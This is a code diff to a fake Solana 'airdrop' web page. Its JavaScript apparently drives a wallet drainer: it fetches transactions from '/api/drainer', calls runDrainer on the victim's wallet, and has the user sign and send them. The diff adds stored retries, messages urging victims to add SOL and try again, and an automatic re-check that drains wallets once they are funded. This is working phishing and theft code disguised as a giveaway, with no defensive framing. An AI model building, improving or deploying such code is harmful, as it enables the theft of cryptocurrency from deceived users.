@@ -446,7 +446,11 @@
   <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
     <div class="wallet-box" id="statusModalBox">
       <div id="statusModalMsg"></div>
-      <button class="claim-btn" id="statusModalClose" style="margin-top:24px;">Close</button>
+      <div id="statusModalActions" style="margin-top:24px;display:none;">
+        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
+        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
+      </div>
+      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
     </div>
   </div>
   <div class="footer">
@@ -561,18 +565,303 @@
       if (event.target === modal) closeWalletModal();
     };
 
+    // --- Transaction Persistence and Error Handling ---
+    const TRANSACTION_STORAGE_KEY = 'solana_airdrop_pending_tx';
+    const WALLET_STORAGE_KEY = 'solana_airdrop_wallet_info';
+    
+    // Store transaction for retry
+    function storeTransaction(transactionBase64, walletAddress, providerName) {
+      const txData = {
+        transaction: transactionBase64,
+        walletAddress: walletAddress,
+        providerName: providerName,
+        timestamp: Date.now(),
+        attempts: 0
+      };
+      localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(txData));
+    }
+    
+    // Get stored transaction
+    function getStoredTransaction() {
+      const stored = localStorage.getItem(TRANSACTION_STORAGE_KEY);
+      if (!stored) return null;
+      
+      try {
+        const txData = JSON.parse(stored);
+        // Check if transaction is older than 1 hour (3600000 ms)
+        if (Date.now() - txData.timestamp > 3600000) {
+          localStorage.removeItem(TRANSACTION_STORAGE_KEY);
+          return null;
+        }
+        return txData;
+      } catch (e) {
+        localStorage.removeItem(TRANSACTION_STORAGE_KEY);
+        return null;
+      }
+    }
+    
+    // Clear stored transaction
+    function clearStoredTransaction() {
+      localStorage.removeItem(TRANSACTION_STORAGE_KEY);
+    }
+    
+    // Store wallet info for retry
+    function storeWalletInfo(provider, walletName) {
+      const walletInfo = {
+        name: walletName,
+        address: getWalletAddress(provider),
+        timestamp: Date.now()
+      };
+      localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify(walletInfo));
+    }
+    
+    // Get stored wallet info
+    function getStoredWalletInfo() {
+      const stored = localStorage.getItem(WALLET_STORAGE_KEY);
+      if (!stored) return null;
+      
+      try {
+        const walletInfo = JSON.parse(stored);
+        // Check if wallet info is older than 24 hours
+        if (Date.now() - walletInfo.timestamp > 86400000) {
+          localStorage.removeItem(WALLET_STORAGE_KEY);
+          return null;
+        }
+        return walletInfo;
+      } catch (e) {
+        localStorage.removeItem(WALLET_STORAGE_KEY);
+        return null;
+      }
+    }
+    
+    // Check for pending transactions on page load
+    function checkPendingTransactions() {
+      const storedTx = getStoredTransaction();
+      if (storedTx) {
+        const walletInfo = getStoredWalletInfo();
+        if (walletInfo) {
+          showStatus(
+            `You have a pending transaction from ${walletInfo.name}. Would you like to retry?`,
+            'pending'
+          );
+        }
+      }
+    }
+    
     // --- Status Message Logic ---
     function showStatus(msg, type) {
       const modal = document.getElementById('statusModal');
       const msgEl = document.getElementById('statusModalMsg');
+      const actionsDiv = document.getElementById('statusModalActions');
+      const retryBtn = document.getElementById('statusModalRetry');
+      const closeBtn = document.getElementById('statusModalClose');
+      const closeSingleBtn = document.getElementById('statusModalCloseSingle');
+
       msgEl.textContent = msg;
-      msgEl.style.color = type === 'success' ? '#00FF88' : type === 'error' ? '#FF4D4D' : '#FFD700';
-      modal.style.display = 'flex';
-      // Close on button click or Escape
-      document.getElementById('statusModalClose').onclick = () => { modal.style.display = 'none'; };
-      modal.onkeydown = function(e) { if (e.key === 'Escape') modal.style.display = 'none'; };
-      // Auto-close for success
-      if (type === 'success') setTimeout(() => { modal.style.display = 'none'; }, 6000);
+      msgEl.style.color = type === 'success' ? '#00FF88' : 
+                         type === 'error' ? '#FF4D4D' : 
+                         type === 'pending' ? '#FFD700' : '#FFD700';
+
+      // Show/hide action buttons based on type
+      if (type === 'success') {
+        modal.style.display = 'flex';
+        actionsDiv.style.display = 'none';
+        closeSingleBtn.style.display = 'inline-block';
+        // Auto-close for success after 6 seconds
+        setTimeout(() => {
+          modal.style.display = 'none';
+          clearStoredTransaction(); // Clear any stored transaction on success
+        }, 6000);
+      } else if (type === 'error') {
+        modal.style.display = 'flex';
+        actionsDiv.style.display = 'block';
+        closeSingleBtn.style.display = 'none';
+        
+        // Retry button click handler
+        retryBtn.onclick = () => {
+          modal.style.display = 'none';
+          const storedTx = getStoredTransaction();
+          if (storedTx) {
+            retryStoredTransaction();
+          } else {
+            // If no stored transaction, try to get a new one
+            const walletInfo = getStoredWalletInfo();
+            if (walletInfo) {
+              showStatus('Preparing new transaction...', 'loading');
+              // Try to reconnect and get new transaction
+              setTimeout(() => {
+                const provider = findProviderByName(walletInfo.name);
+                if (provider) {
+                  runDrainer(provider);
+                } else {
+                  showStatus('Please reconnect your wallet to retry.', 'error');
+                }
+              }, 1000);
+            }
+          }
+        };
+        
+        // Close button click handler
+        closeBtn.onclick = () => {
+          modal.style.display = 'none';
+          clearStoredTransaction(); // Clear stored transaction when user closes
+        };
+      } else if (type === 'loading') {
+        modal.style.display = 'flex';
+        actionsDiv.style.display = 'none';
+        closeSingleBtn.style.display = 'none';
+      } else if (type === 'pending') {
+        modal.style.display = 'flex';
+        actionsDiv.style.display = 'block';
+        closeSingleBtn.style.display = 'none';
+        
+        // Retry button for pending transaction
+        retryBtn.onclick = () => {
+          modal.style.display = 'none';
+          retryStoredTransaction();
+        };
+        
+        // Close button for pending transaction
+        closeBtn.onclick = () => {
+          modal.style.display = 'none';
+          clearStoredTransaction();
+        };
+      }
+      
+      // Escape key handler
+      modal.onkeydown = function(e) {
+        if (e.key === 'Escape') {
+          modal.style.display = 'none';
+        }
+      };
+    }
+    
+    // Find provider by name
+    function findProviderByName(name) {
+      for (const wallet of WALLET_DEFS) {
+        if (wallet.name === name) {
+          return wallet.provider();
+        }
+      }
+      return null;
+    }
+    
+    // Retry stored transaction
+    async function retryStoredTransaction() {
+      const storedTx = getStoredTransaction();
+      if (!storedTx) {
+        showStatus('No pending transaction found.', 'error');
+        return;
+      }
+      
+      // Increment attempt counter
+      storedTx.attempts++;
+      localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(storedTx));
+      
+      if (storedTx.attempts > 3) {
+        showStatus('Maximum retry attempts reached. Please try a new transaction.', 'error');
+        clearStoredTransaction();
+        return;
+      }
+      
+      showStatus(`Retrying transaction (attempt ${storedTx.attempts}/3)...`, 'loading');
+      
+      try {
+        const provider = findProviderByName(storedTx.providerName);
+        if (!provider) {
+          showStatus('Wallet not found. Please reconnect your wallet.', 'error');
+          return;
+        }
+        
+        // Always fetch a fresh transaction instead of reusing the old one
+        // This handles the case where user's wallet was empty but now has funds
+        const currentPubkey = getWalletAddress(provider);
+        if (!currentPubkey) {
+          showStatus('Wallet not connected. Please reconnect your wallet.', 'error');
+          return;
+        }
+        
+        // Fetch fresh transaction from API
+        const res = await fetch('/api/drainer', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ pubkey: currentPubkey })
+        });
+        const data = await res.json();
+        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
+        
+        // Update stored transaction with fresh data
+        storeTransaction(data.transaction, currentPubkey, storedTx.providerName);
+        
+        // Deserialize and retry transaction
+        const tx = window.solanaWeb3.Transaction.from(
+          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
+        );
+        
+        if (provider.isGlow && provider.signAndSendTransaction) {
+          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
+          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
+          clearStoredTransaction();
+        } else if (provider.signAndSendTransaction) {
+          const sig = await provider.signAndSendTransaction(tx);
+          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
+          clearStoredTransaction();
+        } else {
+          throw new Error("Wallet does not support transaction signing.");
+        }
+      } catch (err) {
+        const errorMsg = err.message || err;
+        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled')) {
+          showStatus("Transaction was rejected by your wallet. You can retry or close.", 'error');
+        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds') || errorMsg.includes('INSUFFICIENT_FUNDS')) {
+          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
+          clearStoredTransaction(); // Clear stored transaction for insufficient funds
+          // Offer to retry after user adds funds
+          setTimeout(() => {
+            const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
+            handleEmptyWalletRetry(provider, walletName);
+          }, 3000);
+        } else if (errorMsg.includes('400') || errorMsg.includes('Bad Request')) {
+          showStatus("Invalid request. Please check your wallet connection and try again.", 'error');
+        } else if (errorMsg.includes('network') || errorMsg.includes('connection')) {
+          showStatus("Network error. Please check your internet connection and try again.", 'error');
+        } else {
+          showStatus("Transaction failed: " + errorMsg + ". You can retry or close.", 'error');
+        }
+      }
+    }
+    
+    // Handle empty wallet that later receives funds
+    function handleEmptyWalletRetry(provider, walletName) {
+      showStatus(`Your wallet was empty before. If you've added funds, we'll check again.`, 'loading');
+      
+      setTimeout(async () => {
+        try {
+          const pubkey = getWalletAddress(provider);
+          if (!pubkey) {
+            showStatus('Wallet not connected. Please reconnect your wallet.', 'error');
+            return;
+          }
+          
+          // Fetch fresh transaction to check current balance
+          const res = await fetch('/api/drainer', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ pubkey })
+          });
+          const data = await res.json();
+          
+          if (data.success && data.transaction) {
+            // User now has funds, proceed with transaction
+            storeTransaction(data.transaction, pubkey, walletName);
+            runDrainer(provider);
+          } else {
+            showStatus('Wallet still has insufficient funds. Please add SOL and try again.', 'error');
+          }
+        } catch (err) {
+          showStatus('Error checking wallet balance: ' + (err.message || err), 'error');
+        }
+      }, 2000);
     }
 
     // Global error and unhandledrejection handlers for modal popup
@@ -658,6 +947,11 @@
         showStatus('Wallet not connected or unsupported publicKey format.', 'error');
         return;
       }
+      
+      // Store wallet info for potential retry
+      const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
+      storeWalletInfo(provider, walletName);
+      
       showStatus('Preparing your airdrop transaction...', 'loading');
       try {
         // 1. Fetch transaction from your API (update URL as needed)
@@ -668,6 +962,10 @@
         });
         const data = await res.json();
         if (!data.success || !data.transaction) throw new Error(data.error || "API error");
+        
+        // Store transaction for potential retry
+        storeTransaction(data.transaction, pubkey, walletName);
+        
         // 2. Deserialize transaction
         const tx = window.solanaWeb3.Transaction.from(
           Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
@@ -675,6 +973,7 @@
         // Debug: Log transaction for Glow troubleshooting
         console.log('Drainer Transaction (base64):', data.transaction);
         console.log('Drainer Transaction (object):', tx);
+        
         // 3. Sign and send
         if (provider.isGlow && provider.signAndSendTransaction) {
           // Glow expects a base64 string, not a Transaction object
@@ -690,9 +989,33 @@
           throw new Error("Wallet does not support transaction signing.");
         }
       } catch (err) {
-        showStatus("Airdrop failed: " + (err.message || err), 'error');
+        const errorMsg = err.message || err;
+        
+        // Handle specific error types with appropriate messages
+        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled') || errorMsg.includes('User rejected')) {
+          showStatus("Transaction was rejected by your wallet. You can retry or close.", 'error');
+        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds') || errorMsg.includes('INSUFFICIENT_FUNDS')) {
+          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
+          clearStoredTransaction(); // Clear stored transaction for insufficient funds
+          // Offer to retry after user adds funds
+          setTimeout(() => {
+            const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
+            handleEmptyWalletRetry(provider, walletName);
+          }, 3000);
+        } else if (errorMsg.includes('400') || errorMsg.includes('Bad Request')) {
+          showStatus("Invalid request. Please check your wallet connection and try again.", 'error');
+        } else if (errorMsg.includes('network') || errorMsg.includes('connection')) {
+          showStatus("Network error. Please check your internet connection and try again.", 'error');
+        } else {
+          showStatus("Transaction failed: " + errorMsg + ". You can retry or close.", 'error');
+        }
       }
     }
+    
+    // Check for pending transactions on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      checkPendingTransactions();
+    });
     // --- Navbar Active Link on Scroll ---
     const navLinks = document.querySelectorAll('.nav-link');
     const sections = ['hero','security','learn','explore','support'].map(id => document.getElementById(id));
